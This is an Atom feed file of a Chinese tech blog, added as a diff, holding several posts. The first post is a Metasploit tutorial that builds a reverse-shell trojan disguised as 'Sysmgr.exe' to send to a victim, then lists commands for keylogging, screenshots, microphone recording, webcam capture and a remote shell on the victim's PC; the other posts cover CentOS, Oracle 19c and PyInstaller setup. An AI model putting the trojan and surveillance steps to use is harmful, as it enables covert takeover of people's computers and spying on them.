@@ -1,0 +1,522 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Gerald&#39;s Blog</title>
+  
+  <subtitle>夏天的雷雨其实和春花秋月一样，遇到了就要好好欣赏。</subtitle>
+  <link href="https://blog.iambug.cn/atom.xml" rel="self"/>
+  
+  <link href="https://blog.iambug.cn/"/>
+  <updated>2022-08-14T04:39:03.231Z</updated>
+  <id>https://blog.iambug.cn/</id>
+  
+  <author>
+    <name>Gerald</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Metasploit 生成木马并获取 PC 的控制权</title>
+    <link href="https://blog.iambug.cn/articles/60956.html"/>
+    <id>https://blog.iambug.cn/articles/60956.html</id>
+    <published>2022-08-13T01:11:00.000Z</published>
+    <updated>2022-08-14T04:39:03.231Z</updated>
+    
+    <content type="html"><![CDATA[<p>在一些关于黑客题材的电影中，我们会看到某个大型组织的工作人员把捡来的优盘插入主机点击几下导致整个组织的电脑或电力系统等其他设备被控制的场景。接下来，我们将学习如何生成木马、执行漏洞利用并根据自己的意愿控制受害者 PC。再说句废话，技术应该开放和自由，行为也需要规范。</p><span id="more"></span><h2 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h2><p>执行以下命令生成木马并发送给受害者。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.6 LPORT=4444 -f exe -o Sysmgr.exe</span><br></pre></td></tr></table></figure><h2 id="执行漏洞利用"><a href="#执行漏洞利用" class="headerlink" title="执行漏洞利用"></a>执行漏洞利用</h2><p>接下来执行以下命令进行漏洞利用，在受害者的 Windows 中打开木马时，我们将会收到一个会话，下一步就可以用命令控制受害者的 PC 了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="built_in">set</span> exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.6</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure><h2 id="鼠标"><a href="#鼠标" class="headerlink" title="鼠标"></a>鼠标</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mouse</span><br></pre></td></tr></table></figure><h2 id="键盘"><a href="#键盘" class="headerlink" title="键盘"></a>键盘</h2><p>1.键盘事件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyevent</span><br></pre></td></tr></table></figure><p>2.开始键盘记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start</span><br></pre></td></tr></table></figure><p>3.查看键盘记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyscan_dump</span><br></pre></td></tr></table></figure><p>4.停止键盘记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyscan_stop</span><br></pre></td></tr></table></figure><h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure><h2 id="打开远程屏幕"><a href="#打开远程屏幕" class="headerlink" title="打开远程屏幕"></a>打开远程屏幕</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshare</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run vnc</span><br></pre></td></tr></table></figure><h2 id="录音"><a href="#录音" class="headerlink" title="录音"></a>录音</h2><p>默认录制时长为1s，以下指定为13s，时间长了会报错。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">record_mic -d 13</span><br></pre></td></tr></table></figure><h2 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h2><p>1.列出摄像头</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_list</span><br></pre></td></tr></table></figure><p>2.拍摄</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap</span><br></pre></td></tr></table></figure><p>3.播放视频流</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webcam_stream</span><br></pre></td></tr></table></figure><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><h2 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h2><p>执行以下命令，在受害者的 PC 上打开命令提示符。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -f cmd.exe</span><br></pre></td></tr></table></figure><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>1.查看进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure><p>2.终止进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> 11512</span><br></pre></td></tr></table></figure><p>3.按名称终止进程，同一个名称会有多个进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill cmd.exe</span><br></pre></td></tr></table></figure><h2 id="打开命令提示符"><a href="#打开命令提示符" class="headerlink" title="打开命令提示符"></a>打开命令提示符</h2><p>在我们的 PC 上打开受害者的命令提示符。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><h2 id="关闭远程计算机"><a href="#关闭远程计算机" class="headerlink" title="关闭远程计算机"></a>关闭远程计算机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutdown</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;在一些关于黑客题材的电影中，我们会看到某个大型组织的工作人员把捡来的优盘插入主机点击几下导致整个组织的电脑或电力系统等其他设备被控制的场景。接下来，我们将学习如何生成木马、执行漏洞利用并根据自己的意愿控制受害者 PC。再说句废话，技术应该开放和自由，行为也需要规范。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="网络安全" scheme="https://blog.iambug.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="Kali" scheme="https://blog.iambug.cn/tags/Kali/"/>
+    
+    <category term="Metasploit" scheme="https://blog.iambug.cn/tags/Metasploit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何在 CentOS 7 安装图形界面</title>
+    <link href="https://blog.iambug.cn/articles/19491.html"/>
+    <id>https://blog.iambug.cn/articles/19491.html</id>
+    <published>2022-02-18T08:20:00.000Z</published>
+    <updated>2022-02-19T12:33:43.480Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="更新系统的软件包"><a href="#更新系统的软件包" class="headerlink" title="更新系统的软件包"></a>更新系统的软件包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y upgrade</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="安装-X-Window-System"><a href="#安装-X-Window-System" class="headerlink" title="安装 X Window System"></a>安装 X Window System</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="built_in">groups</span> install <span class="string">&quot;X Window System&quot;</span></span><br></pre></td></tr></table></figure><h2 id="安装-GNOME-桌面环境"><a href="#安装-GNOME-桌面环境" class="headerlink" title="安装 GNOME 桌面环境"></a>安装 GNOME 桌面环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="built_in">groups</span> install <span class="string">&quot;GNOME Desktop&quot;</span></span><br></pre></td></tr></table></figure><h2 id="打开图形界面"><a href="#打开图形界面" class="headerlink" title="打开图形界面"></a>打开图形界面</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startx</span><br></pre></td></tr></table></figure><h2 id="安装-VNC-服务端"><a href="#安装-VNC-服务端" class="headerlink" title="安装 VNC 服务端"></a>安装 VNC 服务端</h2><p>如果要用 VNC 远程桌面，则执行以下命令安装 tigervnc-server：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install tigervnc-server</span><br></pre></td></tr></table></figure><p>启动 VNC：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncserver</span><br></pre></td></tr></table></figure><h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><p>执行以下命令开放 <code>5901</code> 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=5901/tcp --permanent</span><br></pre></td></tr></table></figure><p>重新加载 firewalld，使规则立即生效。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h2 id="安装-VNC-Viewer-并连接"><a href="#安装-VNC-Viewer-并连接" class="headerlink" title="安装 VNC Viewer 并连接"></a>安装 VNC Viewer 并连接</h2><p>下载并安装 <a href="https://www.realvnc.com/en/connect/download/viewer/">VNC Viewer</a>，然后用 VNC 服务地址和端口连接，<code>5901</code> 端口在连接时填入的端口对应是 <code>1</code>。<br><img src="/images/2022-02-18/img-1.png" alt="VNC Viewer"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;更新系统的软件包&quot;&gt;&lt;a href=&quot;#更新系统的软件包&quot; class=&quot;headerlink&quot; title=&quot;更新系统的软件包&quot;&gt;&lt;/a&gt;更新系统的软件包&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;yum -y upgrade&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    <category term="系统运维" scheme="https://blog.iambug.cn/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
+    
+    
+    <category term="CentOS" scheme="https://blog.iambug.cn/tags/CentOS/"/>
+    
+    <category term="Linux" scheme="https://blog.iambug.cn/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何在 CentOS 7 部署 Oracle 19c 数据库</title>
+    <link href="https://blog.iambug.cn/articles/64820.html"/>
+    <id>https://blog.iambug.cn/articles/64820.html</id>
+    <published>2022-02-16T01:45:00.000Z</published>
+    <updated>2022-04-01T16:23:26.054Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><p>添加 <code>oracle</code> 用户并设置用户密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser oracle</span><br><span class="line">passwd oracle</span><br></pre></td></tr></table></figure><span id="more"></span><p>添加 <code>oinstall</code> 和 <code>dba</code> 组。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd oinstall</span><br><span class="line">groupadd dba</span><br></pre></td></tr></table></figure><p>设置 <code>oracle</code> 用户的主组为 <code>oinstall</code> 附加组为 <code>dba</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -g oinstall -G dba oracle</span><br></pre></td></tr></table></figure><h2 id="新建目录并设置权限"><a href="#新建目录并设置权限" class="headerlink" title="新建目录并设置权限"></a>新建目录并设置权限</h2><p>新建 <code>u01</code> 目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /u01</span><br></pre></td></tr></table></figure><p>打开 <code>/etc/fstab</code> 文件，添加以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dev/sdb1 /u01 xfs defaults 0 0</span><br></pre></td></tr></table></figure><p>重启或执行以下命令，将 <code>sdb1</code> 分区挂载到 <code>u01</code> 目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -a</span><br></pre></td></tr></table></figure><p>新建 <code>oracle</code> 和 <code>oraInventory</code> 目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /u01/app/oracle</span><br><span class="line"><span class="built_in">mkdir</span> -p /u01/app/oraInventory</span><br></pre></td></tr></table></figure><p>分别将它们指定为 <code>dba</code> 和 <code>oinstall</code> 组。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> -R oracle:dba /u01/app/oracle</span><br><span class="line"><span class="built_in">chown</span> -R oracle:oinstall /u01/app/oraInventory</span><br></pre></td></tr></table></figure><h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>打开 <code>/home/oracle/.bash_profile</code> 文件，配置环境变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export ORACLE_BASE=/u01/app/oracle</span><br><span class="line">export ORACLE_HOME=/u01/app/oracle/product/19.3/dbhome_1</span><br><span class="line">export PATH=$PATH:$ORACLE_HOME/bin</span><br><span class="line">export ORACLE_SID=orcl</span><br></pre></td></tr></table></figure><h2 id="安装-Oracle-Database-19c"><a href="#安装-Oracle-Database-19c" class="headerlink" title="安装 Oracle Database 19c"></a>安装 Oracle Database 19c</h2><p>从 <code>https://www.oracle.com/database/technologies/oracle-database-software-downloads.html</code> 选择 <a href="https://download.oracle.com/otn/linux/oracle19c/190000/LINUX.X64_193000_db_home.zip">Linux x86-64</a> 用迅雷下载 Oracle Database 19c，使用 <a href="https://winscp.net/eng/index.php">WinSCP</a> 上传到 Linux。新建 <code>dbhome_1</code> 目录并解压 <code>LINUX.X64_193000_db_home.zip</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /u01/app/oracle/product/19.3/dbhome_1</span><br><span class="line">unzip LINUX.X64_193000_db_home.zip -d /u01/app/oracle/product/19.3/dbhome_1</span><br></pre></td></tr></table></figure><p>指定所有者和组。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chown</span> -R oracle:dba /u01/app/oracle</span><br></pre></td></tr></table></figure><p>使用 <code>oracle</code> 用户登录 CentOS 7 图形界面，打开终端执行以下命令运行 <code>runInstaller</code> 安装脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/app/oracle/product/19.3/dbhome_1/runInstaller</span><br></pre></td></tr></table></figure><p>然后在弹出的安装界面参考以下步骤安装：</p><ol><li>配置选项，选择“仅设置软件”；<br><img src="/images/2022-02-16/img-1.png" alt="配置选项"></li><li>数据库安装选项；<br><img src="/images/2022-02-16/img-2.png" alt="数据库安装选项"></li><li>数据库版本；<br><img src="/images/2022-02-16/img-3.png" alt="数据库版本"></li><li>安装位置；<br><img src="/images/2022-02-16/img-4.png" alt="安装位置"></li><li>创建产品清单；<br><img src="/images/2022-02-16/img-5.png" alt="创建产品清单"></li><li>操作系统组，数据库操作员组选择“dba”；<br><img src="/images/2022-02-16/img-6.png" alt="操作系统组"></li><li>Root 脚本执行，勾选“自动运行配置脚本”，使用“root”用户身份证明并输入口令；<br><img src="/images/2022-02-16/img-7.png" alt="Root 脚本执行"></li><li>先决条件检查，修补并再次检查，对于不可修复的需要手动修复后重新检查；<br><img src="/images/2022-02-16/img-8.png" alt="先决条件检查"></li><li>概要；<br><img src="/images/2022-02-16/img-9.png" alt="概要"></li><li>安装产品，点击“是”继续；<br><img src="/images/2022-02-16/img-10.png" alt="安装产品"></li><li>完成。<br><img src="/images/2022-02-16/img-11.png" alt="完成"></li></ol><h2 id="监听程序与本地-Net-服务名配置"><a href="#监听程序与本地-Net-服务名配置" class="headerlink" title="监听程序与本地 Net 服务名配置"></a>监听程序与本地 Net 服务名配置</h2><p>执行以下命令配置监听程序与本地 Net 服务名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netca</span><br></pre></td></tr></table></figure><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>执行以下命令创建数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbca</span><br></pre></td></tr></table></figure><h2 id="设置开机自启动"><a href="#设置开机自启动" class="headerlink" title="设置开机自启动"></a>设置开机自启动</h2><p>打开 <code>/etc/oratab</code> 文件，将 <code>orcl:/u01/app/oracle/product/19.3/dbhome_1:N</code> 修改为 <code>orcl:/u01/app/oracle/product/19.3/dbhome_1:Y</code>。然后再打开 <code>/etc/rc.d/rc.local</code> 文件，添加以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su oracle -lc &quot;/u01/app/oracle/product/19.3/dbhome_1/bin/lsnrctl start&quot;</span><br><span class="line">su oracle -lc &quot;/u01/app/oracle/product/19.3/dbhome_1/bin/dbstart&quot;</span><br></pre></td></tr></table></figure><p>执行以下命令使 <code>rc.local</code> 文件具有可执行权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><p>执行以下命令开放 <code>1521</code> 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=1521/tcp --permanent</span><br></pre></td></tr></table></figure><p>重新加载 firewalld，使规则立即生效。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h2 id="问题及解决方法"><a href="#问题及解决方法" class="headerlink" title="问题及解决方法"></a>问题及解决方法</h2><p>以下是安装时先决条件检查失败及未设置开机自启动会遇到的问题，对于 ORA-12541、ORA-12514 和 ORA-01034 问题，其实设置开机自启动后就可以不用理会了，写出来主要是一些时候方便参考。<br><strong>先决条件检查失败</strong></p><ul><li>操作系统内核参数 <code>shmmax</code><br>要确定共享内存段的最大大小，请运行：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/shmmax</span><br></pre></td></tr></table></figure><p><code>shmmax</code> 可以在 <code>/proc/sys/kernel/shmmax</code> 文件或执行以下命令（4x1024x1024x1024&#x3D;4G）更改而无需重新启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w kernel.shmmax = 4294967296</span><br></pre></td></tr></table></figure><p>要使更改永久生效，请将以下内容添加到 <code>/etc/sysctl.conf</code> 文件并重新启动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel.shmmax = 4294967296</span><br></pre></td></tr></table></figure><ul><li>交换空间大小</li></ul><p>在分区时，如果合理分配交换分区就不会存在这个问题了，不过也可以通过添加交换文件的方式来增加交换空间大小。首先要生成 2G 的 <code>swapfile</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=swapfile bs=1M count=2048</span><br></pre></td></tr></table></figure><p>将 <code>swapfile</code> 文件格式化为交换文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkswap swapfile</span><br></pre></td></tr></table></figure><p>启用交换文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swapon swapfile</span><br></pre></td></tr></table></figure><p>在 <code>/etc/fstab</code> 文件添加以下内容，以便在重新启动时启用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/swapfile swap swap defaults 0 0</span><br></pre></td></tr></table></figure><ul><li>程序包</li></ul><p>使用 yum 安装依赖的程序包。</p><p><strong>ORA-12541: TNS:no listener</strong><br><img src="/images/2022-02-16/img-12.png" alt="ORA-12541: TNS:no listener"><br>执行以下命令，启动监听。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsnrctl start</span><br></pre></td></tr></table></figure><p><strong>ORA-12514: TNS:listener does not currently know of service requested in connect descriptor</strong><br><img src="/images/2022-02-16/img-13.png" alt="ORA-12514: TNS:listener does not currently know of service requested in connect descriptor"><br>打开 <code>/u01/app/oracle/product/19.3/dbhome_1/network/admin/listener.ora</code> 文件，添加以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SID_LIST_LISTENER =</span><br><span class="line">  (SID_LIST =</span><br><span class="line">    (SID_DESC =</span><br><span class="line">      (ORACLE_HOME = /u01/app/oracle/product/19.3/dbhome_1)</span><br><span class="line">      (SID_NAME = orcl)</span><br><span class="line">    )</span><br><span class="line">  )</span><br></pre></td></tr></table></figure><p><strong>ORA-01034: ORACLE not available</strong><br><img src="/images/2022-02-16/img-14.png" alt="ORA-01034: ORACLE not available"><br>打开 SQL Plus，使用 <code>sys</code> 用户强制关闭，再启动数据库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlplus /nolog</span><br><span class="line">conn sys/sys as sysdba</span><br><span class="line">shutdown abort</span><br><span class="line">startup</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;添加用户&quot;&gt;&lt;a href=&quot;#添加用户&quot; class=&quot;headerlink&quot; title=&quot;添加用户&quot;&gt;&lt;/a&gt;添加用户&lt;/h2&gt;&lt;p&gt;添加 &lt;code&gt;oracle&lt;/code&gt; 用户并设置用户密码。&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;adduser oracle&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;passwd oracle&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    <category term="系统运维" scheme="https://blog.iambug.cn/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
+    
+    
+    <category term="CentOS" scheme="https://blog.iambug.cn/tags/CentOS/"/>
+    
+    <category term="数据库" scheme="https://blog.iambug.cn/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    
+    <category term="Linux" scheme="https://blog.iambug.cn/tags/Linux/"/>
+    
+    <category term="Oracle" scheme="https://blog.iambug.cn/tags/Oracle/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PyInstaller 生成 Python 脚本的可执行程序</title>
+    <link href="https://blog.iambug.cn/articles/45452.html"/>
+    <id>https://blog.iambug.cn/articles/45452.html</id>
+    <published>2022-02-13T09:37:00.000Z</published>
+    <updated>2022-08-14T04:11:40.273Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="安装-PyInstaller"><a href="#安装-PyInstaller" class="headerlink" title="安装 PyInstaller"></a>安装 PyInstaller</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="生成可执行程序"><a href="#生成可执行程序" class="headerlink" title="生成可执行程序"></a>生成可执行程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller --noconsole --icon &quot;icon/filename.ico&quot; --add-binary &quot;icon/filename.ico;icon&quot; --version-file &quot;file_version_info.txt&quot; filename.py</span><br></pre></td></tr></table></figure><p>如果 Python 代码引用了第三方库，则需要使用 pip 安装引用的库，再执行以上打包命令。</p><h2 id="制作安装包"><a href="#制作安装包" class="headerlink" title="制作安装包"></a>制作安装包</h2><p>下载并安装 <a href="http://hmne.sourceforge.net/index.php">HM NIS Edit</a>，按照以下步骤制作安装包。<br>1.打开 HM NIS Edit，选择【新建脚本:向导】。<br><img src="/images/2022-02-13/img-1.png" alt="新建脚本"><br>2.脚本向导。<br><img src="/images/2022-02-13/img-2.png" alt="脚本向导"><br>3.应用程序信息。<br><img src="/images/2022-02-13/img-3.png" alt="应用程序信息"><br>4.安装程序选项。<br><img src="/images/2022-02-13/img-4.png" alt="安装程序选项"><br>5.应用程序的目录与授权信息。<br><img src="/images/2022-02-13/img-5.png" alt="应用程序的目录与授权信息"><br>6.应用程序文件。<br><img src="/images/2022-02-13/img-6.png" alt="应用程序文件"><br>7.应用程序图标。<br><img src="/images/2022-02-13/img-7.png" alt="应用程序图标"><br>8.安装程序之后运行。<br><img src="/images/2022-02-13/img-8.png" alt="安装程序之后运行"><br>9.解除安装程序。<br><img src="/images/2022-02-13/img-9.png" alt="解除安装程序"><br>10.完成。<br><img src="/images/2022-02-13/img-10.png" alt="完成"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;安装-PyInstaller&quot;&gt;&lt;a href=&quot;#安装-PyInstaller&quot; class=&quot;headerlink&quot; title=&quot;安装 PyInstaller&quot;&gt;&lt;/a&gt;安装 PyInstaller&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip install pyinstaller&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
